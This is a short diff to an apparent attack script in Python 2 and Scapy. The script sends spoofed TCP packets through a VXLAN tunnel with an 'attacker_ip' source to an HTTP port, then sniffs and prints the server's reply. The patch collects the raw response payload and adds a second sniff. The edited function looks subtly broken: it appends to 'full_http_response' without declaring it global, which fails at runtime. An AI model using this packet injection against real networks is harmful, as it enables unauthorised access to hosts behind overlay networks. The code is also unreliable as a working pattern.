@@ -47,7 +47,7 @@ global full_http_response
 def get_http_packet(packet):
         global http_answer 
         http_answer = packet
-        #full_http_response 
+        full_http_response += packet.getlayer(Raw).load
         return
 
 
@@ -80,6 +80,7 @@ send(VXLAN / IP(src=attacker_ip,dst=dest) / TCP(dport=http_port, sport=syn_ack_d
 
 #Get the HTTP Reply
 sniff(filter = "tcp port " + str(http_port), prn=get_http_packet, count = 1)
+sniff(filter = "tcp port " + str(http_port), prn=get_http_packet, count = 1)
 
 
 
@@ -109,7 +110,7 @@ http_layer = http_answer.getlayer(http.HTTPResponse)
 ip_layer = http_answer.getlayer(IP)
 raw = http_answer.getlayer(Raw)
 print '\n{0[src]} Sends a response on {1[Date]} and Server {1[Server]} and Content is \r\n\r\n'.format(ip_layer.fields, http_layer.fields)
-print(raw.load)
+print(full_http_response)
 
 
 #test
